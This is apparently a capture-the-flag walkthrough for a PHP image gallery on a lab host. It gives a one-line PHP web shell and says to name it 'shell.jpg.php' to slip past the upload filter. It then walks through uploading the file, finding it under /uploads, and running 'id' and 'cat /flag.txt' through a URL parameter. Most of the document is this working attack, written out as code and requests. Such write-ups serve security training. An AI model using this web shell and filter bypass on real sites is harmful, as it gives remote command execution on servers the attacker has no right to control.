<img width="417" height="536" alt="Screenshot 2026-07-12 075542" src="https://github.com/user-attachments/assets/8f929feb-6cd7-47a4-99c7-663c2f618f36" />

### Step 1: Create an account

* Open the website.
* Register a new account.
* Log in.

---

### Step 2: Go to the Gallery

* Open **Gallery** (`gallery.php`).
* This is where you can upload images.

---

### Step 3: Create your payload

Create a PHP file containing:

```php
<?=`{$_GET[0]}`;?>
```

Save it as:

```text
shell.jpg.php
```

The `.jpg.php` filename helps bypass the upload filter.

---

### Step 4: Upload the file

Upload `shell.jpg.php` to the gallery.

If the upload succeeds, the server will save it in the **uploads** folder.

---

### Step 5: Find the file

After uploading, look at the image or the delete link. You'll see something similar to:

```text
delete.php?img=<hash>.jpg.php
```

Your uploaded file is located at:

```text
http://10.5.14.225:30020/uploads/<hash>.jpg.php
```

Replace `<hash>` with the filename shown by the website.

---

### Step 6: Test it

Open:

```text
http://10.5.14.225:30020/uploads/<hash>.jpg.php?0=id
```

If it works, you'll see information about the server user.

---

### Step 7: Read the flag

Open:

```text
http://10.5.14.225:30020/uploads/<hash>.jpg.php?0=cat%20/flag.txt
```

The flag will be displayed.
